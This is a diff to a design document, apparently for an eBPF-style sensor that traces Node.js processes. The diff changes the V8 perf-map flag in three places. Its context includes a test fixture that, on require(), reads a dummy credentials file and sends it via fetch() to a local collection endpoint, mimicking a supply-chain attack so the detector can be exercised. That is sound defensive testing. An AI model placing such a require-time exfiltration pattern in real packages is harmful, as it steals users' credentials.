@@ -257,7 +257,7 @@ We then, in user space, turn each address into a source location:
 - **JIT addresses** (V8-compiled JS): resolve via `/tmp/perf-<pid>.map`.
 
 ### 5.2 Tier 1 — perf-map JIT resolution (BUILD THIS)
-When Node runs with `--perf-basic-prof --interpreted-frames-native-stack`, V8 continuously writes `/tmp/perf-<pid>.map`. Each line is:
+When Node runs with `--perf-basic-prof-only-functions --interpreted-frames-native-stack`, V8 continuously writes `/tmp/perf-<pid>.map`. Each line is:
 ```
 <hex_start_addr> <hex_size> <symbol>
 ```
@@ -462,7 +462,7 @@ The deck's credibility rests on replaying the May-2026 attacks. **Build a *benig
 - `good-pkg-1.0.1/index.js`: identical API, but on `require()` **also** reads `./FAKE_credentials_do_not_use.txt` (a dummy file you ship in the fixture) and does `fetch("http://127.0.0.1:9999/collect")` (a local sink you run). This is the benign stand-in for the node-ipc "fires at require()" pattern.
 
 ### 10.2 Test workload — `test/workload/server.js`
-An Express app that `require`s `good-pkg`. Start it with `node --perf-basic-prof --interpreted-frames-native-stack server.js`.
+An Express app that `require`s `good-pkg`. Start it with `node --perf-basic-prof-only-functions --interpreted-frames-native-stack server.js`.
 
 ### 10.3 E2E script — `test/e2e/drift_test.sh`
 1. Deploy sensor + collector locally (or in kind).
@@ -504,7 +504,7 @@ The sensor resolves target files under `/host/proc/<pid>/root/...` and perf maps
 
 ### 11.3 Injecting `--perf-basic-prof` (Tier 1 requirement)
 Two options, document both in `values.yaml`:
-- **Manual (v1 default):** instruct the customer to add `NODE_OPTIONS=--perf-basic-prof --interpreted-frames-native-stack` (or the node arg) to their app deployment. One line, no code change.
+- **Manual (v1 default):** instruct the customer to add `NODE_OPTIONS=--perf-basic-prof-only-functions --interpreted-frames-native-stack` (or the node arg) to their app deployment. One line, no code change.
 - **Automatic (v1.1):** ship a `MutatingAdmissionWebhook` that injects the env var into pods matching a label. Architect for it; build after first pilot.
 - **Tier 2:** removes this entirely.
 
